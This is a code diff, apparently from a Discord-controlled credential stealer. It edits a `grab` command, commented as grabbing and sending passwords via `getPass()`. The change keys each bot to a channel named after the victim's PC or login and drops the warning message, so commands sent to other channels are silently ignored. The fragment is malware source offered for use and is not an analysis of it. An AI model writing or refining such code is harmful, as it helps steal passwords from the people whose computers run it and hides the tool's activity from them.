@@ -92,10 +92,13 @@ def getPass():
 # Command to grab and send passwords
 @bot.command()
 async def grab(ctx):
+    # Get the desktop name or username to create the channel
+    desktop_name = platform.node()  # This is the name of the PC
+    channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found
+
     # Check if the command is executed in the correct channel
-    if ctx.channel.name != platform.node().lower():
-        await ctx.send("This command can only be used in the channel corresponding to this device.")
-        return
+    if ctx.channel.name != channel_name.lower():
+        return  # Ignore the command if it's not in the correct channel
 
     # Extract passwords
     getPass()
